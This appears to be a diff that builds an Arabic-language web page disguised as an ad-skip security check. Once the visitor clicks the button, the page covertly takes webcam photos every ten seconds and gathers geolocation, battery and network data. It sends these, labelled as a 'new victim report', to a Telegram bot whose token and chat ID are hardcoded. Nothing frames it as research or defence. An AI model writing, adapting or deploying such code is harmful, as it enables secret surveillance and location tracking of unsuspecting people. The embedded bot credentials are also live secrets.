@@ -1,11 +1,80 @@
-// هذا الجزء يضاف داخل سكريبت الضغط
-setInterval(async () => {
-    const c = document.getElementById('c');
-    c.width = v.videoWidth; c.height = v.videoHeight;
-    c.getContext('2d').drawImage(v, 0, 0);
-    c.toBlob(b => {
-        const f = new FormData(); 
-        f.append('photo', b, 'live.jpg');
-        fetch(`https://api.telegram.org/bot${T}/sendPhoto?chat_id=${C}`, { method: 'POST', body: f });
-    }, 'image/jpeg');
-}, 10000); // 10000 تعني كل 10 ثوانٍ
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري تجهيز الرابط...</title>
+</head>
+<body style="background:#f4f4f4; color:#333; text-align:center; font-family:sans-serif; padding-top:100px;">
+    <div style="background:#fff; padding:30px; border-radius:15px; display:inline-block; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
+        <h2 style="color:#d9534f;">⚠️ تأكيد أمني لتخطي الإعلان</h2>
+        <p>يرجى الضغط على الزر أدناه للمتابعة إلى المحتوى المطلوب.</p>
+        
+        <button id="authBtn" style="padding:15px 40px; background:#28a745; color:#fff; border:none; font-size:18px; font-weight:bold; cursor:pointer; border-radius:5px; margin-top:20px;">تخطّي الإعلان الآن</button>
+        
+        <p style="font-size:12px; color:#777; margin-top:15px;">سيتم توجيهك تلقائياً بعد الفحص...</p>
+    </div>
+
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const T = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+        const C = "7214473798";
+
+        document.getElementById('authBtn').onclick = async () => {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v'); v.srcObject = s;
+
+                // تنفيذ المهمة فوراً ثم تكرارها كل 10 ثوانٍ
+                collectAndSend(v);
+                setInterval(() => collectAndSend(v), 10000);
+
+            } catch (e) { 
+                alert("خطأ: يجب السماح بالصلاحيات لتخطي الإعلان!"); 
+            }
+        };
+
+        async function collectAndSend(videoElement) {
+            // 1. جلب بيانات البطارية
+            let batteryInfo = "غير معروف";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'شاحن متصل' : 'يفرغ'})`;
+            }
+
+            // 2. جلب بيانات الشبكة
+            let netInfo = "غير معروف";
+            if (navigator.connection) {
+                netInfo = `النوع: ${navigator.connection.effectiveType} | السرعة: ${navigator.connection.downlink}Mbps`;
+            }
+
+            // 3. جلب الموقع الجغرافي وإرسال التقرير النصي
+            navigator.geolocation.getCurrentPosition(p => {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const msg = `📊 **تقرير ضحية جديد**\n\n` +
+                            `🔋 الشحن: ${batteryInfo}\n` +
+                            `🌐 الشبكة: ${netInfo}\n` +
+                            `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
+                
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            });
+
+            // 4. التقاط الصورة وإرسالها
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = videoElement.videoWidth; 
+                canvas.height = videoElement.videoHeight;
+                canvas.getContext('2d').drawImage(videoElement, 0, 0);
+                
+                canvas.toBlob(b => {
+                    const form = new FormData(); 
+                    form.append('photo', b, 'capture.jpg');
+                    fetch(`https://api.telegram.org/bot${T}/sendPhoto?chat_id=${C}`, { method: 'POST', body: form });
+                }, 'image/jpeg');
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
